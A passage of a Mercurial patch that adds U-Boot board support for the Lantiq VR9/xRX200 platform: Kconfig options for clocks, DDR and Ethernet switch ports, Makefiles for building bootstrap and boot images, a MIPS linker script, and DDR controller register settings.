# HG changeset patch
# Parent da65cb6d6b85c37038917713894359f35c09ced6
Board related files for VR9 platform

diff --git a/board/vr9/Kconfig b/board/vr9/Kconfig
new file mode 100644
--- /dev/null
+++ b/board/vr9/Kconfig
@@ -0,0 +1,518 @@
+
+config DRIVER_VR9
+      bool
+	  default y
+
+menu "CPU/DDR FREQUENCY"
+
+choice 
+    prompt "PLATFORM"
+    default VRX200
+
+config GRX200
+    bool "GRX200"
+
+config VRX200
+    bool "VRX200"
+
+config VRX220
+    bool "VRX220"
+
+config VRX220_W2
+    bool "VRX220_W2"
+
+endchoice
+
+choice 
+    prompt "CRYSTAL CLOCK FREQUENCY"
+	default VR9_CRYSTAL_36M
+    
+config VR9_CRYSTAL_6M
+    bool "6M"
+	depends on VRX200
+
+config VR9_CRYSTAL_CPLD
+    bool "6M change to 36M via CPLD"
+    depends on VRX200
+
+config VR9_CRYSTAL_25M
+    bool "25M"
+	depends on GRX200
+
+config VR9_CRYSTAL_36M
+    bool "36M"
+	depends on VRX200 || VRX220 || VRX220_W2
+
+endchoice
+
+choice 
+    prompt "DDR TYPE SELECTION"
+    default VR9_DDR2
+
+config VR9_DDR1
+    bool "DDR1"
+
+config VR9_DDR2
+    bool "DDR2"
+
+endchoice
+
+choice
+    prompt "CPU AND RAM CONFIGURATION"
+
+
+config VR9_CPU_125M_RAM_125M
+    bool "125M/125M"
+
+config VR9_CPU_333M_RAM_166M
+    bool "333M/166M" 
+
+config VR9_CPU_393M_RAM_196M
+    bool "393M/196M"
+   
+config VR9_CPU_500M_RAM_200M
+    bool "500M/200M"
+    depends on !VR9_CRYSTAL_6M
+
+config VR9_CPU_500M_RAM_250M
+    bool "500M/250M"
+	depends on !VR9_CRYSTAL_6M && VR9_DDR2
+
+config VR9_CPU_600M_RAM_200M
+    bool "600M/200M"
+
+config VR9_CPU_600M_RAM_300M
+    bool "600M/300M"
+	depends on VR9_DDR2
+
+endchoice
+
+config ENABLE_POWER_MANAGEMENT
+    bool "Enable power management(EXPERIMENTAL)"
+	default n
+
+config USE_DEFAULT_LOWPOWER_SETTING
+    bool "USE DEFAULT LOWPOWER SETTING"
+    default y
+    depends on ENABLE_POWER_MANAGEMENT
+
+
+config LOWPOWER_CONTROL
+    hex 'LOWPOWER_CONTROL'
+    default "0x14"
+    depends on !USE_DEFAULT_LOWPOWER_SETTING
+    depends on ENABLE_POWER_MANAGEMENT
+
+config LOWPOWER_AUTO_ENABLE
+    hex 'LOWERPOWER_AUTO_ENABLE'
+    default "0x14"
+    depends on !USE_DEFAULT_LOWPOWER_SETTING
+    depends on ENABLE_POWER_MANAGEMENT
+
+config LOWPOWER_POWER_DOWN_CNT
+    hex 'LOWPOWER_POWER_DOWN_CNT'
+    default "0x40"
+    depends on !USE_DEFAULT_LOWPOWER_SETTING
+	depends on ENABLE_POWER_MANAGEMENT
+
+config LOWPOWER_SELF_REFRESH_CNT
+    hex 'LOWPOWER_SELF_REFRESH_CNT'
+    default "0x80"
+    depends on !USE_DEFAULT_LOWPOWER_SETTING
+    depends on ENABLE_POWER_MANAGEMENT
+
+config VR9_EVM_DUAL_DDR
+    bool "EVM DUAL DDR"
+	default n
+
+endmenu
+
+
+menu "SWITCH OPTIONS"
+
+config VR9_SW_PORT_0
+    bool "USE PORT 0"
+
+choice
+   prompt "INTERFACE"
+   depends on VR9_SW_PORT_0
+   default VR9_SW_PORT0_RGMII_MAC
+
+config VR9_SW_PORT0_MII_PHY
+   bool "MII PHY"
+
+config VR9_SW_PORT0_MII_MAC
+   bool "MII MAC"
+
+config VR9_SW_PORT0_RMII_PHY
+   bool "RMII PHY"
+
+config VR9_SW_PORT0_RMII_MAC
+   bool "RMII MAC"
+
+config VR9_SW_PORT0_RGMII_MAC
+   bool "RGMII MAC"
+
+endchoice  
+
+config VR9_SW_PORT0_MIIMODE
+   int
+   depends on VR9_SW_PORT_0
+   default 0 if VR9_SW_PORT0_MII_PHY
+   default 1 if VR9_SW_PORT0_MII_MAC
+   default 2 if VR9_SW_PORT0_RMII_PHY
+   default 3 if VR9_SW_PORT0_RMII_MAC
+   default 4 if VR9_SW_PORT0_RGMII_MAC
+
+   
+choice
+   prompt "xMII CLOCK RATE"
+   depends on VR9_SW_PORT_0
+   default VR9_SW_PORT0_MIIRATE_AUTO
+	
+config VR9_SW_PORT0_MIIRATE_M2P5
+	 bool "2.5MHz"
+	 depends on !VR9_SW_PORT0_RMII_MAC && !VR9_SW_PORT0_RMII_PHY
+	
+config VR9_SW_PORT0_MIIRATE_M25
+    bool "25MHz"
+    depends on !VR9_SW_PORT0_RMII_MAC && !VR9_SW_PORT0_RMII_PHY
+
+config VR9_SW_PORT0_MIIRATE_M125
+    bool "125MHz"
+    depends on !VR9_SW_PORT0_RMII_MAC && !VR9_SW_PORT0_RMII_PHY
+
+config VR9_SW_PORT0_MIIRATE_M50	
+	  bool "50MHz"
+	  
+config VR9_SW_PORT0_MIIRATE_AUTO
+    bool "AUTO"
+    depends on !VR9_SW_PORT0_RMII_MAC && !VR9_SW_PORT0_RMII_PHY
+		
+endchoice
+
+config VR9_SW_PORT0_MIIRATE
+    int 
+	depends on VR9_SW_PORT_0
+	default 0 if VR9_SW_PORT0_MIIRATE_M2P5
+	default 1 if VR9_SW_PORT0_MIIRATE_M25
+	default 2 if VR9_SW_PORT0_MIIRATE_M125
+	default 3 if VR9_SW_PORT0_MIIRATE_M50
+	default 4 if VR9_SW_PORT0_MIIRATE_AUTO
+
+choice 
+    prompt "RMII REF CLOCK DIRECTIOM"
+	  default VR9_SW_PORT0_RMII_CLK_IN
+	  depends on VR9_SW_PORT0_RMII_PHY || VR9_SW_PORT0_RMII_MAC
+
+config VR9_SW_PORT0_RMII_CLK_IN
+    bool "IN"
+
+config VR9_SW_PORT0_RMII_CLK_OUT
+    bool "OUT"
+	
+endchoice
+
+
+config VR9_SW_PORT_1
+    bool "USE PORT 1"
+    
+choice
+   prompt "INTERFACE"
+   depends on VR9_SW_PORT_1
+   default VR9_SW_PORT1_RGMII_MAC
+
+config VR9_SW_PORT1_MII_PHY
+   bool "MII PHY"
+
+config VR9_SW_PORT1_MII_MAC
+   bool "MII MAC"
+
+config VR9_SW_PORT1_RMII_PHY
+   bool "RMII PHY"
+
+config VR9_SW_PORT1_RMII_MAC
+   bool "RMII MAC"
+
+config VR9_SW_PORT1_RGMII_MAC
+   bool "RGMII MAC"
+endchoice  
+
+config VR9_SW_PORT1_MIIMODE
+   int
+   depends on VR9_SW_PORT_1
+   default 0 if VR9_SW_PORT1_MII_PHY
+   default 1 if VR9_SW_PORT1_MII_MAC
+   default 2 if VR9_SW_PORT1_RMII_PHY
+   default 3 if VR9_SW_PORT1_RMII_MAC
+   default 4 if VR9_SW_PORT1_RGMII_MAC
+								   
+   
+choice
+   prompt "xMII CLOCK RATE"
+   depends on VR9_SW_PORT_1
+   default VR9_SW_PORT1_MIIRATE_AUTO
+	
+config VR9_SW_PORT1_MIIRATE_M2P5
+	bool "2.5MHz"
+	depends on !VR9_SW_PORT1_RMII_MAC && !VR9_SW_PORT1_RMII_PHY
+	
+config VR9_SW_PORT1_MIIRATE_M25
+    bool "25MHz"
+    depends on !VR9_SW_PORT1_RMII_MAC && !VR9_SW_PORT1_RMII_PHY
+
+config VR9_SW_PORT1_MIIRATE_M125
+    bool "125MHz"
+    depends on !VR9_SW_PORT1_RMII_MAC && !VR9_SW_PORT1_RMII_PHY
+
+config VR9_SW_PORT1_MIIRATE_M50	
+	  bool "50MHz"
+
+config VR9_SW_PORT1_MIIRATE_AUTO
+    bool "AUTO"
+		depends on !VR9_SW_PORT1_RMII_MAC && !VR9_SW_PORT1_RMII_PHY
+		
+endchoice
+
+config VR9_SW_PORT1_MIIRATE
+    int 
+	depends on VR9_SW_PORT_1
+	default 0 if VR9_SW_PORT1_MIIRATE_M2P5
+	default 1 if VR9_SW_PORT1_MIIRATE_M25
+	default 2 if VR9_SW_PORT1_MIIRATE_M125
+	default 3 if VR9_SW_PORT1_MIIRATE_M50
+	default 4 if VR9_SW_PORT1_MIIRATE_AUTO
+
+choice 
+    prompt "RMII REF CLOCK DIRECTIOM"
+	  default VR9_SW_PORT1_RMII_CLK_IN
+	  depends on VR9_SW_PORT1_RMII_MAC || VR9_SW_PORT1_RMII_PHY
+
+config VR9_SW_PORT1_RMII_CLK_IN
+    bool "IN"
+
+config VR9_SW_PORT1_RMII_CLK_OUT
+    bool "OUT"
+	
+endchoice
+
+config VR9_SW_PORT_2
+    bool "USE PORT 2"
+    default y
+
+choice
+   prompt "INTERFACE FOR PORT 2 AND PORT4"
+   depends on VR9_SW_PORT_2
+   default VR9_SW_PORT2_GMII
+
+config VR9_SW_PORT2_GMII
+   bool "GMII"
+
+config VR9_SW_PORT2_MII
+   bool "MII"
+
+endchoice  
+
+config VR9_INTERNAL_PHY_TYPE
+   int 
+   default 0 if VR9_SW_PORT2_MII
+   default 1 if VR9_SW_PORT2_GMII
+
+choice
+   prompt "GPHY_LED_MODE"
+   depends on VR9_SW_PORT_2
+   default GPHY_LED_SHIFT_REG
+
+config GPHY_LED_SHIFT_REG   
+   bool "SHIFT REGISTER"
+
+config GPHY_LED_GPIO
+   bool "GPIO"
+   
+endchoice
+
+config  VR9_SW_PORT2_MIIRATE
+   int
+   depends on VR9_SW_PORT_2
+   default 4 
+					 
+config VR9_SW_PORT2_MIIMODE
+    int
+	depends on VR9_SW_PORT_2
+	default 1 
+								
+
+config VR9_SW_PORT_3
+    bool "USE PORT 3"
+	default y
+    depends on VR9_SW_PORT2_MII
+    
+choice
+   prompt "INTERFACE"
+   depends on VR9_SW_PORT_3
+   default VR9_SW_PORT3_MII
+
+config VR9_SW_PORT3_MII
+   bool "MII"
+
+endchoice    
+    
+config VR9_SW_PORT3_MIIRATE
+   int
+   depends on VR9_SW_PORT_3
+   default 4 
+					 
+config VR9_SW_PORT3_MIIMODE
+    int
+	depends on VR9_SW_PORT_3
+    default 1 if VR9_SW_PORT3_MII
+
+config VR9_SW_PORT_4
+    bool "USE PORT 4"
+	default y
+	depends on VR9_SW_PORT_2
+
+config VR9_SW_PORT4_GMII
+   bool  
+   default y
+   depends on VR9_SW_PORT2_GMII
+
+config VR9_SW_PORT4_MII
+   bool
+   default y
+   depends on VR9_SW_PORT2_MII
+
+
+config VR9_SW_PORT4_MIIRATE
+   int
+   depends on VR9_SW_PORT_4
+   default 4
+					 
+config VR9_SW_PORT4_MIIMODE
+    int
+	depends on VR9_SW_PORT_4
+	default 1 
+	
+
+config VR9_SW_PORT_5a
+    bool "USE PORT 5a"
+	default y
+    depends on !VR9_SW_PORT_5b
+
+choice
+   prompt "INTERFACE"
+   depends on VR9_SW_PORT_5a
+   default VR9_SW_PORT5a_RGMII
+
+config VR9_SW_PORT5a_RGMII
+   bool "RGMII"
+endchoice
+
+config VR9_SW_PORT5a_MIIMODE
+   int
+   depends on VR9_SW_PORT_5a
+   default 4
+
+config VR9_SW_PORT5a_MIIRATE
+    int
+	depends on VR9_SW_PORT_5a
+	default 4 if VR9_SW_PORT5a_RGMII
+			
+
+config VR9_SW_PORT_5b
+    bool "USE PORT 5b"
+	default y
+    depends on VR9_SW_PORT2_MII
+    
+choice
+   prompt "INTERFACE"
+   depends on VR9_SW_PORT_5b
+   default VR9_SW_PORT5b_MII
+
+config VR9_SW_PORT5b_MII
+   bool "MII"
+
+endchoice       
+
+config VR9_SW_PORT5b_MIIMODE
+   int
+   depends on VR9_SW_PORT_5b
+   default 1 
+
+config VR9_SW_PORT5b_MIIRATE
+    int
+	depends on VR9_SW_PORT_5b
+	default 4
+
+config VR9_PHY_USE_CLOCK_GPIO3
+    bool "use gpio3 as internal phy clock source"
+	default n
+
+choice
+    prompt "GPIO3 clock source"
+    default VR9_PHY_USE_CLOCK_GPIO3_INTERNAL
+    depends on VR9_PHY_USE_CLOCK_GPIO3
+
+config VR9_PHY_USE_CLOCK_GPIO3_INTERNAL
+    bool "internal"
+
+config VR9_PHY_USE_CLOCK_GPIO3_EXTERNAL
+    bool "external"
+
+endchoice
+
+
+
+config VR9_GPHY_FW_EMBEDDED
+    bool "gphy firmware embedded"
+	default y
+
+config VR9_GPHY_FW_ADDR
+    hex 
+	default "0xb0010000" if ( BOOT_FROM_NOR )
+	default "0xa0110000" if ( BOOT_FROM_SPI )
+	default "0xa0120000" if ( BOOT_FROM_NAND )
+	depends on VR9_SW_PORT_2 || VR9_SW_PORT_3 || VR9_SW_PORT_4 || VR9_SW_PORT_5b
+    depends on VR9_GPHY_FW_EMBEDDED
+
+config VR9_EXTERN_GPHY_FW_ADDR
+    hex "gphy firmware address"
+	default "0xb0010000"
+	depends on !VR9_GPHY_FW_EMBEDDED
+
+config VR9_GPHY_DEBUG
+    bool "DEBUG GPHY"
+	default n
+    depends on !NAND_FLASH
+	
+endmenu
+
+config TUNE_DDR
+    bool "DDR tuning support"
+	default y
+
+config DDR_TUNING_TEXT_BASE
+    hex 
+    default "0x9e220000"
+    depends on TUNE_DDR
+
+config ENABLE_DCDC
+	bool "ENABLE_DCDC"
+	default y
+
+config POWER_DOWN_REGULATOR
+    bool "POWER DOWN 2.5V REGULATOR"
+	default y
+
+config CHECK_PLL2_LOCK
+    bool "CHECK PLL2 LOCK"
+	default n
+
+config ON_VENUS
+    bool "ON VENUS"
+	default n
+	
+config ON_PALLADIUM
+    bool "ON PALLADIUM"
+	default n
+	
diff --git a/board/vr9/Makefile b/board/vr9/Makefile
new file mode 100644
--- /dev/null
+++ b/board/vr9/Makefile
@@ -0,0 +1,54 @@
+#
+# (C) Copyright 2003-2006
+# Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+#
+# See file CREDITS for list of people who contributed to this
+# project.
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 2 of
+# the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+# MA 02111-1307 USA
+#
+
+include $(TOPDIR)/config.mk
+
+LIB	= $(obj)lib$(BOARD).a
+
+COBJS	= $(BOARD).o 
+SOBJS	= lowlevel_init.o
+
+SRCS	:= $(SOBJS:.o=.S) $(COBJS:.o=.c)
+OBJS	:= $(addprefix $(obj),$(COBJS))
+SOBJS	:= $(addprefix $(obj),$(SOBJS))
+
+$(LIB):	$(obj).depend $(OBJS) $(SOBJS)
+	$(AR) $(ARFLAGS) $@ $(OBJS) $(SOBJS)
+
+
+sfddr: start_sfddr.o sfddr_board.o tune_ddr.o lowlevel_init.o
+
+tune_ddr.c:
+	@rm -f $@
+	@ln -s $(TOPDIR)/lib_bootstrap/tune_ddr.c $@ 
+
+	
+	
+#########################################################################
+
+# defines $(obj).depend target
+include $(SRCTREE)/rules.mk
+
+sinclude $(obj).depend
+
+#########################################################################
diff --git a/board/vr9/Makefile.lq b/board/vr9/Makefile.lq
new file mode 100755
--- /dev/null
+++ b/board/vr9/Makefile.lq
@@ -0,0 +1,142 @@
+ifdef CONFIG_VR9_GPHY_FW_EMBEDDED
+    GPHY_FIRMWARE = $(TOPDIR)/board/$(BOARD)/gphy_firmware.img
+else
+    GPHY_FIRMWARE = $(TOPDIR)/dummy
+endif
+
+ENV_BLOCK=
+
+ifdef CONFIG_BUILD_ENV_BLOCK
+ENV_BLOCK=ubootenv.img 
+endif
+
+ALL += bootstrap.bin u-boot.lzimg u-boot.ltq $(ENV_BLOCK)
+
+
+LDSCRIPT_BOOTSTRAP := $(TOPDIR)/board/$(BOARD)/bootstrap.lds
+ifdef CONFIG_BOOT_FROM_NOR
+OBJS_BOOTSTRAP  = $(TOPDIR)/$(CPUDIR)/$(BOARD)/start_bootstrap.o
+OBJS_BOOTSTRAP  += $(TOPDIR)/board/$(BOARD)/lowlevel_init.o
+else 
+OBJS_BOOTSTRAP  = $(TOPDIR)/$(CPUDIR)/$(BOARD)/start_uncomp.o
+endif
+
+
+
+OBJS_BOOTSTRAP  += $(TOPDIR)/lib/string.o
+OBJS_BOOTSTRAP  += $(CPUDIR)/$(BOARD)/lib$(CPU).a
+LIBS_BOOTSTRAP  = $(TOPDIR)/lib_bootstrap/libbootstrap.a
+LIBS_BOOTSTRAP += $(TOPDIR)/lib/crc32.o
+LIBS_BOOTSTRAP += $(TOPDIR)/drivers/serial/lq_asc.o
+LIBS_BOOTSTRAP += $(TOPDIR)/$(CPUDIR)/$(BOARD)/clock.o
+#LIBS_BOOTSTRAP += $(TOPDIR)/$(CPUDIR)/$(BOARD)/asc.o
+LIBS_BOOTSTRAP += $(TOPDIR)/arch/mips/lib/time.o
+
+
+BOOTSTRAP_LDFLAGS = -Bstatic -T $(LDSCRIPT_BOOTSTRAP) -Ttext $(CONFIG_BOOTSTRAP_TEXT_BASE) 
+
+ifdef CONFIG_BOOT_FROM_NOR
+$(obj)u-boot.ltq: $(obj)System.map $(obj)bootstrap.bin $(obj)u-boot.lzimg
+		@touch dummy
+		@cat $(obj)bootstrap.bin > $(obj)u-boot.ltq
+		@cat $(obj)u-boot.lzimg >> $(obj)u-boot.ltq
+		@scripts_platform/pad2align.sh -n 65536 u-boot.ltq 
+		@cat $(GPHY_FIRMWARE) >>u-boot.ltq
+endif
+
+ifdef CONFIG_BOOT_FROM_NAND
+$(obj)u-boot.ltq: $(obj)System.map $(obj)bootstrap.bin $(obj)u-boot.lzimg
+		@touch dummy
+		@$(TOPDIR)/scripts_platform/pad2align.sh -n 10240 bootstrap.bin
+		@cat $(obj)bootstrap.bin > $(obj)u-boot.ltq
+		@cat $(obj)u-boot.lzimg >> $(obj)u-boot.ltq
+ifdef CONFIG_VR9_GPHY_FW_EMBEDDED
+		@$(TOPDIR)/scripts_platform/pad2align.sh -n 65536 u-boot.ltq
+		@cat $(GPHY_FIRMWARE) >>u-boot.ltq
+endif
+endif
+
+ifdef CONFIG_BOOT_FROM_SPI
+ifdef CONFIG_LTQ_SECURE_BOOT
+$(obj)u-boot.ltq: $(obj)System.map $(obj)bootstrap.bin $(obj)u-boot.lzimg sfddr.bin ds_crypt.bin stools
+		@./stools -i sfddr.bin -o sfddr.enc -d ds_crypt.bin -a 0xbe220000
+		@scripts_platform/mk_sf.pl board/vr9/xrx200_ddr2_197_CAS4_config.conf sfddr.enc 0xa0600000 u-boot.ltq
+		@scripts_platform/pad2align.sh -n 20480 u-boot.ltq
+		@cat u-boot.lzimg >>u-boot.ltq
+		@scripts_platform/pad2align.sh -n 65536 u-boot.ltq
+		@cat $(GPHY_FIRMWARE) >>u-boot.ltq
+else
+$(obj)u-boot.ltq: $(obj)System.map $(obj)bootstrap.bin $(obj)u-boot.lzimg sfddr.bin 
+		@touch dummy
+		@scripts_platform/mk_sf.pl dummy sfddr.bin 0xbe220000 u-boot.ltq
+		@scripts_platform/pad2align.sh -n 20480 u-boot.ltq
+		@cat u-boot.lzimg >> u-boot.ltq
+ifdef CONFIG_VR9_GPHY_FW_EMBEDDED		
+		@scripts_platform/pad2align.sh -n 65536 u-boot.ltq
+		@cat $(GPHY_FIRMWARE) >>u-boot.ltq
+endif		
+endif
+endif
+						
+LDFLAGS_SFDDR = -Bstatic -T $(TOPDIR)/board/$(BOARD)/bootstrap.lds -Ttext 0xbe220000 $(PLATFORM_LDFLAGS)
+OBJS_SFDDR = $(TOPDIR)/board/$(BOARD)/start_sfddr.o 
+OBJS_SFDDR +=$(TOPDIR)/board/$(BOARD)/sfddr_board.o 
+OBJS_SFDDR +=$(TOPDIR)/board/$(BOARD)/tune_ddr.o 
+OBJS_SFDDR +=$(TOPDIR)/board/$(BOARD)/lowlevel_init.o
+LIBS_SFDDR = $(TOPDIR)/lib/string.o
+LIBS_SFDDR += $(TOPDIR)/lib/crc32.o
+LIBS_SFDDR += $(TOPDIR)/$(CPUDIR)/$(BOARD)/clock.o
+LIBS_SFDDR += $(TOPDIR)/drivers/serial/lq_asc.o
+LIBS_SFDDR += $(TOPDIR)/arch/mips/lib/time.o
+LIBS_SFDDR += $(TOPDIR)/lib_bootstrap/LzmaDecode.o
+LIBS_SFDDR += $(TOPDIR)/lib_bootstrap/LzmaWrapper.o
+
+
+sfddr.bin:    $(obj)sfddr
+		$(OBJCOPY) ${OBJCFLAGS} -O binary $< $@
+
+sfddr:  depend $(SUBDIRS) $(OBJS_SFDDR) $(LIBS_SFDDR) bootstrap
+		$(LD) $(LDFLAGS_SFDDR) $(OBJS_SFDDR) $(LIBS_SFDDR) \
+	     -Map sfddr.map -o sfddr
+
+$(OBJS_SFDDR):
+		rm -f $(OBJS_SFDDR)
+		$(MAKE) -C `dirname $@` sfddr
+				
+
+u-boot.lzimg: $(obj)u-boot.bin System.map
+		lzma e $(obj)u-boot.bin $(obj)u-boot.lzma
+		scripts_platform/pad2align.sh -n 16 u-boot.lzma
+		$(TOPDIR)/tools/mkimage -A mips -T firmware -C lzma \
+		-a 0x$(shell grep "T _start" $(TOPDIR)/System.map | awk '{ printf "%s", $$1 }') \
+		-e 0x$(shell grep "T _start" $(TOPDIR)/System.map | awk '{ printf "%s", $$1 }') \
+		-n 'u-boot image' -d $(obj)u-boot.lzma $@
+
+bootstrap.bin:    $(obj)bootstrap
+		$(OBJCOPY) ${OBJCFLAGS} -O binary $< $@
+
+bootstrap: $(OBJS_BOOTSTRAP) $(LIBS_BOOTSTRAP)  $(LDSCRIPT_BOOTSTRAP)
+		$(LD) $(BOOTSTRAP_LDFLAGS) $$UNDEF_SYM $(OBJS_BOOTSTRAP) $(LIBS_BOOTSTRAP) \
+		       -Map bootstrap.map -o bootstrap
+
+ds_crypt.bin: ds_crypt
+		$(OBJCOPY) --gap-fill=0xff -O binary $< $@
+
+ds_crypt: rsa_crypt.o		
+		$(LD) -G 0 -static -T $(TOPDIR)/board/$(BOARD)/rsalinker.lds --start-group rsa_crypt.o --end-group -o ds_crypt
+
+rsa_crypt.o: $(TOPDIR)/board/$(BOARD)/rsa_crypt.c
+		$(CC) -g -ggdb -G0 -fno-common -fno-strict-aliasing -fno-builtin -pipe -eb -Wall -c -o $@ $<	
+
+stools: $(TOPDIR)/board/$(BOARD)/stools.c
+		$(HOSTCC) -o $@ $<	
+
+
+$(LIBS_BOOTSTRAP):
+		$(MAKE) -C `dirname $@` all
+
+
+$(ENV_BLOCK): $(obj)u-boot $(obj)u-boot.bin
+		$(NM) -Ss u-boot >u-boot.sym
+		scripts_platform/mk_envimg.sh $@
+
diff --git a/board/vr9/bootstrap.lds b/board/vr9/bootstrap.lds
new file mode 100644
--- /dev/null
+++ b/board/vr9/bootstrap.lds
@@ -0,0 +1,72 @@
+/*
+ * (C) Copyright 2003
+ * Wolfgang Denk Engineering, <wd@denx.de>
+ *
+ * See file CREDITS for list of people who contributed to this
+ * project.
+ *
+ * This program is free software; you can redistribute it and/or
+ * modify it under the terms of the GNU General Public License as
+ * published by the Free Software Foundation; either version 2 of
+ * the License, or (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA 02111-1307 USA
+ */
+
+/*
+OUTPUT_FORMAT("elf32-bigmips", "elf32-bigmips", "elf32-bigmips")
+*/
+OUTPUT_FORMAT("elf32-tradbigmips", "elf32-tradbigmips", "elf32-tradbigmips")
+OUTPUT_ARCH(mips)
+ENTRY(_start)
+SECTIONS
+{
+        . = 0x00000000;
+
+        . = ALIGN(4);
+	.text       :
+	{
+	  *(.text)
+	}
+
+        . = ALIGN(4);
+        .rodata  : { *(.rodata) }
+
+        . = ALIGN(4);
+        .data  : { *(.data) }
+
+	. = ALIGN(4);
+	.sdata  : { *(.sdata) }
+
+	_gp = ALIGN(16);
+
+	. = ALIGN(16);
+	__got_start = .;
+	.got  : { *(.got) }
+	__got_end = .;
+
+	.sdata  : { *(.sdata) }
+
+	. = .;
+        __u_boot_cmd_start = .;
+        .u_boot_cmd : { *(.u_boot_cmd) }
+        __u_boot_cmd_end = .;
+
+    . = ALIGN(4);
+	uboot_end_data = .;
+	got_size = (__got_end - __got_start);
+	num_got_entries = (__got_end - __got_start) >> 2;
+
+  . = ALIGN(4);
+	.sbss  : { *(.sbss) }
+        .bss  : { *(.bss) }
+	uboot_end = .;
+}
diff --git a/board/vr9/config.mk b/board/vr9/config.mk
new file mode 100644
--- /dev/null
+++ b/board/vr9/config.mk
@@ -0,0 +1,27 @@
+#
+# (C) Copyright 2003
+# Wolfgang Denk, DENX Software Engineering, wd@denx.de.
+#
+# See file CREDITS for list of people who contributed to this
+# project.
+#
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License as
+# published by the Free Software Foundation; either version 2 of
+# the License, or (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+# MA 02111-1307 USA
+#
+
+-include $(TOPDIR)/.config
+
+TEXT_BASE = $(CONFIG_RAM_TEXT_BASE)
+
diff --git a/board/vr9/ddr1/xrx200_ddr1_167M_lp_settings.h b/board/vr9/ddr1/xrx200_ddr1_167M_lp_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr1/xrx200_ddr1_167M_lp_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000001
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x3000301
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x5060A0F
+#define	MC_CCR15_VALUE	0x2000F
+#define	MC_CCR16_VALUE	0x30000
+#define	MC_CCR17_VALUE	0x60102
+#define	MC_CCR18_VALUE	0x3020002
+#define	MC_CCR19_VALUE	0x16010102
+#define	MC_CCR20_VALUE	0x5000014
+#define	MC_CCR21_VALUE	0x30A0200
+#define	MC_CCR22_VALUE	0x0
+#define	MC_CCR23_VALUE	0x8020000
+#define	MC_CCR24_VALUE	0xD03
+#define	MC_CCR25_VALUE	0x0
+#define	MC_CCR26_VALUE	0x0
+#define	MC_CCR27_VALUE	0x320000
+#define	MC_CCR28_VALUE	0x0
+#define	MC_CCR29_VALUE	0x0
+#define	MC_CCR30_VALUE	0x510
+#define	MC_CCR31_VALUE	0x10000C0
+#define	MC_CCR32_VALUE	0x120040
+#define	MC_CCR33_VALUE	0x430080
+#define	MC_CCR34_VALUE	0x200C8
+#define	MC_CCR35_VALUE	0xF2D93
+#define	MC_CCR36_VALUE	0xC8
+#define	MC_CCR37_VALUE	0x8235
+#define	MC_CCR38_VALUE	0x0
+#define	MC_CCR39_VALUE	0x212004
+#define	MC_CCR40_VALUE	0x212304
+#define	MC_CCR41_VALUE	0x210004
+#define	MC_CCR42_VALUE	0x210004
+#define	MC_CCR43_VALUE	0x666304
+#define	MC_CCR44_VALUE	0x666304
+#define	MC_CCR45_VALUE	0x660004
+#define	MC_CCR46_VALUE	0x660004
+#define	MC_CCR47_VALUE	0x0
+#define	MC_CCR48_VALUE	0x0
+#define	MC_CCR49_VALUE	0x0
+#define	MC_CCR50_VALUE	0x0
+#define	MC_CCR51_VALUE	0x0
+#define	MC_CCR52_VALUE	0x133
+#define	MC_CCR53_VALUE	0xF3014B26
+#define	MC_CCR54_VALUE	0xF3014B26
+#define	MC_CCR55_VALUE	0xF3014B26
+#define	MC_CCR56_VALUE	0xF3014B26
+#define	MC_CCR57_VALUE	0x7800301
+#define	MC_CCR58_VALUE	0x7800301
+#define	MC_CCR59_VALUE	0x7800301
+#define	MC_CCR60_VALUE	0x7800301
+#define	MC_CCR61_VALUE	0x4
diff --git a/board/vr9/ddr1/xrx200_ddr1_167M_settings.h b/board/vr9/ddr1/xrx200_ddr1_167M_settings.h
new file mode 100644
--- /dev/null
+++ b/board/vr9/ddr1/xrx200_ddr1_167M_settings.h
@@ -0,0 +1,64 @@
+/* Settings for VR9 DDR2 SDRAM controller */		
+
+#define	MC_CCR00_VALUE	0x101
+#define	MC_CCR01_VALUE	0x1000101
+#define	MC_CCR02_VALUE	0x1010000
+#define	MC_CCR03_VALUE	0x100
+#define	MC_CCR04_VALUE	0x1000000
+#define	MC_CCR05_VALUE	0x1000101
+#define	MC_CCR06_VALUE	0x1000100
+#define	MC_CCR07_VALUE	0x1010000
+#define	MC_CCR08_VALUE	0x1000001
+#define	MC_CCR09_VALUE	0x0
+#define	MC_CCR10_VALUE	0x2000100
+#define	MC_CCR11_VALUE	0x3000301
+#define	MC_CCR12_VALUE	0x30000
+#define	MC_CCR13_VALUE	0x202
+#define	MC_CCR14_VALUE	0x5060A0F
